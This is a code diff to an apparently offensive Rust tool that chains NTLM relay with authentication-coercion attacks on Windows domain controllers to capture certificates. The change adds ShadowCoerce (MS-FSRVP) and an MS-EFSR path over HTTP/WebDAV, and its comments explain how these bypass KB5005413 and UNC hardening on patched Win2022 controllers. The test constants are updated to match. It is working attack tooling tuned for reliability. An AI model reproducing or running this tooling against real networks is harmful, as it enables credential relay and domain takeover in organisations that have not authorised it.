@@ -1415,8 +1415,36 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
     if captured_via.is_none() && cfg.coerce_user.is_some() {
         let user = cfg.coerce_user.as_deref().unwrap();
         let secret_args = coerce_secret_args(cfg.coerce_secret.as_ref());
-        for proto in ["MS-EFSR", "MS-RPRN"] {
-            summary.push_str(&format!("=== authenticated coerce via {proto} ===\n"));
+        // Protocol/auth-type matrix, ordered by reliability on modern (Win2022
+        // build 20348+, fully patched) DCs against which the previous
+        // [MS-EFSR-smb, MS-RPRN-smb] pair returned NO_AUTH_RECEIVED across
+        // every method:
+        //
+        //   MS-FSRVP (ShadowCoerce) - opcode IsPathSupported. KB5005413 left
+        //                             this RPC interface unhardened; produces
+        //                             auth back to the listener on Win2022.
+        //   MS-EFSR + http auth     - re-tries EFSRPC via the WebClient
+        //                             (WebDAV) path. UNC Hardened Access
+        //                             defaults block IP-literal SMB UNCs but
+        //                             not HTTP UNCs; on any target with
+        //                             WebClient enabled (workstations, some
+        //                             SRVs) this clears NO_AUTH_RECEIVED.
+        //                             ntlmrelayx already listens on :80.
+        //   MS-EFSR + smb           - kept for legacy / unpatched targets
+        //                             (still the highest-yield single shot).
+        //   MS-RPRN + smb           - last resort; KB5005413 silently neutered
+        //                             RpcRemoteFindFirstPrinterChangeNotification*
+        //                             on patched DCs but unpatched member
+        //                             servers may still leak.
+        for (proto, auth_type) in [
+            ("MS-FSRVP", "smb"),
+            ("MS-EFSR", "http"),
+            ("MS-EFSR", "smb"),
+            ("MS-RPRN", "smb"),
+        ] {
+            summary.push_str(&format!(
+                "=== authenticated coerce via {proto} ({auth_type}) ===\n"
+            ));
             let mut a: Vec<&str> = vec![
                 "coerce",
                 "-u",
@@ -1430,7 +1458,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
                 "--filter-protocol-name",
                 proto,
                 "--auth-type",
-                "smb",
+                auth_type,
                 "--always-continue",
             ];
             for s in &secret_args {
@@ -1439,7 +1467,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
             procs
                 .run_phase(
                     &coerce_log,
-                    &format!("coerce via {proto}"),
+                    &format!("coerce via {proto} ({auth_type})"),
                     "coercer",
                     &a,
                     &workdir,
@@ -2286,8 +2314,10 @@ mod tests {
 
     const PHASE1: &str = "unauth PetitPotam";
     const PHASE2: &str = "DFSCoerce";
-    const PHASE3_EFSR: &str = "coerce via MS-EFSR";
-    const PHASE3_RPRN: &str = "coerce via MS-RPRN";
+    const PHASE3_FSRVP: &str = "coerce via MS-FSRVP (smb)";
+    const PHASE3_EFSR_HTTP: &str = "coerce via MS-EFSR (http)";
+    const PHASE3_EFSR: &str = "coerce via MS-EFSR (smb)";
+    const PHASE3_RPRN: &str = "coerce via MS-RPRN (smb)";
 
     #[tokio::test]
     async fn run_attacker_ip_not_local_substitutes_when_locals_available() {
@@ -2453,7 +2483,17 @@ mod tests {
         assert!(out.success);
         assert!(out.stdout.contains("CERT_CAPTURED_VIA=MS-RPRN"));
         let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        assert_eq!(headers, vec![PHASE1, PHASE2, PHASE3_EFSR, PHASE3_RPRN]);
+        assert_eq!(
+            headers,
+            vec![
+                PHASE1,
+                PHASE2,
+                PHASE3_FSRVP,
+                PHASE3_EFSR_HTTP,
+                PHASE3_EFSR,
+                PHASE3_RPRN
+            ]
+        );
     }
 
     #[tokio::test]
